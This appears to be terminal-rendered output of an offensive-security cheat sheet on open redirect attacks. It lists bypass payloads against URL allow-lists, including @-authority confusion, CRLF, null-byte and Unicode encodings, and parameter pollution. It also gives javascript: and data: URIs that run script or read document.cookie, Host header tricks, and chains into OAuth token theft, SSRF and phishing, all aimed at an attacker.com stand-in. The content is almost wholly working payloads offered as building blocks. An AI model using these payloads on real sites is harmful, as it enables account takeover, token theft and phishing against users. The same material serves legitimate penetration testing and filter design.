[34m│[0m **Using @ symbol (URL authority confusion):**                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m http://trusted.com@attacker.com/                                             [34m│[0m
[34m│[0m https://trusted.com@attacker.com/path                                        [34m│[0m
[34m│[0m //{ALLOWED_DOMAIN}@attacker.com                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Whitelisted domain as subdomain:**                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m https://attacker.com/trusted.com                                             [34m│[0m
[34m│[0m https://trusted.com.attacker.com                                             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Creating folders matching allowed domains:**                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m https://attacker.com/https://trusted.com/                                    [34m│[0m
[34m│[0m https://attacker.com/trusted.com/path                                        [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Query string confusion:**                                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?redirect=https://attacker.com?trusted.com                                   [34m│[0m
[34m│[0m ?redirect=https://attacker.com#trusted.com                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **CRLF injection to bypass keyword filters:**                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m java%0d%0ascript%0d%0a:alert(document.domain)                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Dot bypass with Unicode:**                                                 [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m //attacker。com          (fullwidth dot U+3002)                              [34m│[0m
[34m│[0m //attacker%E3%80%82com   (URL-encoded fullwidth dot)                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Null byte bypass:**                                                        [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m //attacker%00.trusted.com                                                    [34m│[0m
[34m│[0m ?redirect=//attacker.com%00                                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **HTTP Parameter Pollution:**                                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?next=trusted.com&next=attacker.com                                          [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### JavaScript-Based Redirects                                               [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m When redirect happens via JavaScript:                                        [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?redirectTo=javascript:alert(document.domain)                                [34m│[0m
[34m│[0m ?url=data:text/html,<script>location='https://attacker.com'</script>         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Path-Based Redirects                                                     [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m When redirect is in path rather than parameter:                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m /redirect/https://attacker.com                                               [34m│[0m
[34m│[0m /redirect/../https://attacker.com                                            [34m│[0m
[34m│[0m /redirect/http:/attacker.com                                                 [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Unicode Normalization Attacks                                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m https://evil.c℀.example.com  → https://evil.ca/c.example.com                 [34m│[0m
[34m│[0m http://a.com／X.b.com        (fullwidth slash)                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Host Header Manipulation                                                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m Some applications use Host header for redirects:                             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Host: attacker.com                                                           [34m│[0m
[34m│[0m X-Forwarded-Host: attacker.com                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Chaining Open Redirect                                                   [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Open redirect to OAuth token theft:**                                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m https://oauth.provider.com/authorize?                                        [34m│[0m
[34m│[0m   client_id=X&                                                               [34m│[0m
[34m│[0m   redirect_uri=https://trusted.com/callback?next=https://attacker.com        [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Open redirect to SSRF:**                                                   [34m│[0m
[34m│[0m Use as hop in SSRF filter bypass.                                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Open redirect to XSS:**                                                    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?redirect=javascript:alert(document.cookie)                                  [34m│[0m
[34m│[0m ?redirect=data:text/html,<script>alert(1)</script>                           [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Redirect Status Codes                                                    [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m | Code | Type | Method Preserved |                                           [34m│[0m
[34m│[0m |------|------|------------------|                                           [34m│[0m
[34m│[0m | 301  | Permanent | No (changes to GET) |                                   [34m│[0m
[34m│[0m | 302  | Found | No (changes to GET) |                                       [34m│[0m
[34m│[0m | 303  | See Other | No (always GET) |                                       [34m│[0m
[34m│[0m | 307  | Temporary | Yes |                                                   [34m│[0m
[34m│[0m | 308  | Permanent | Yes |                                                   [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m Use 307/308 knowledge when crafting redirect chains that need to preserve    [34m│[0m
[34m│[0m POST data.                                                                   [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Building Blocks Approach                                                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m OPEN REDIRECT BUILDING BLOCKS:                                               [34m│[0m
[34m│[0m 1. Parameter: identify redirect parameter name                               [34m│[0m
[34m│[0m 2. Protocol: http://, https://, //, javascript:, data:                       [34m│[0m
[34m│[0m 3. Bypass: @, encoding, unicode, null byte, HPP                              [34m│[0m
[34m│[0m 4. Target: external domain, javascript execution                             [34m│[0m
[34m│[0m 5. Chain: OAuth theft, SSRF hop, phishing                                    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
